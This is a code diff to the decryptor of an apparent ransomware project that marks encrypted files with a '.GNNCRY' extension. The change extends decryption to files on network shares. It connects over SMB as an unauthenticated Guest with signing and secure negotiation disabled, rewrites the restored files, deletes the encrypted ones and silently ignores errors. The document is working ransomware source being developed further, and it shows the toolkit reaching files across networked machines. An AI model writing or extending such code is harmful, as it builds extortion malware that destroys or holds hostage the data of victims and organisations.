@@ -5,12 +5,18 @@ import utils
 import subprocess
 import requests
 import base64
-import string 
+import string
 import random
 import sys
 import time
 import os
 import pickle
+
+try:
+    import smbclient
+    SMB_AVAILABLE = True
+except ImportError:
+    SMB_AVAILABLE = False
 
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
@@ -134,22 +140,42 @@ def menu():
 
         aes_and_path.append((aes_key, base64.b64decode(ret[1])))
 
+    _smb_connected = set()
     for _ in aes_and_path:
         dec = symmetric.AESCipher(_[0])
-        
-        with open(_[1], 'rb') as f:
-            encrypted_file_content = f.read()
-        
-        # decrypt content
-        decrypted_file_content = dec.decrypt(encrypted_file_content)
+        path = _[1]
 
-        # save into new file without .GNNCRY extension
-        old_file_name = _[1].replace(b".GNNCRY", b"")
-        with open(old_file_name, 'wb') as f:
-            f.write(decrypted_file_content if isinstance(decrypted_file_content, bytes) else decrypted_file_content.encode('utf-8'))
-
-        # delete old encrypted file
-        utils.shred(_[1])
+        if path.startswith(b'\\\\') and SMB_AVAILABLE:
+            smb_path = path.decode('utf-8')
+            ip = smb_path[2:].split('\\')[0]
+            try:
+                if ip not in _smb_connected:
+                    smbclient.ClientConfig(require_secure_negotiate=False)
+                    smbclient.register_session(ip, username='Guest', password='',
+                                               auth_protocol='ntlm', require_signing=False)
+                    _smb_connected.add(ip)
+                with smbclient.open_file(smb_path, mode='rb') as f:
+                    encrypted_file_content = f.read()
+                decrypted_file_content = dec.decrypt(encrypted_file_content)
+                old_smb_path = smb_path.replace('.GNNCRY', '')
+                with smbclient.open_file(old_smb_path, mode='wb') as f:
+                    f.write(decrypted_file_content if isinstance(decrypted_file_content, bytes)
+                            else decrypted_file_content.encode('utf-8'))
+                smbclient.remove(smb_path)
+            except Exception:
+                pass
+        else:
+            try:
+                with open(path, 'rb') as f:
+                    encrypted_file_content = f.read()
+                decrypted_file_content = dec.decrypt(encrypted_file_content)
+                old_file_name = path.replace(b'.GNNCRY', b'')
+                with open(old_file_name, 'wb') as f:
+                    f.write(decrypted_file_content if isinstance(decrypted_file_content, bytes)
+                            else decrypted_file_content.encode('utf-8'))
+                utils.shred(path)
+            except Exception:
+                pass
 
     # end of decryptor
     print("{}Decryption finished!{}".format(GREEN, WHITE))
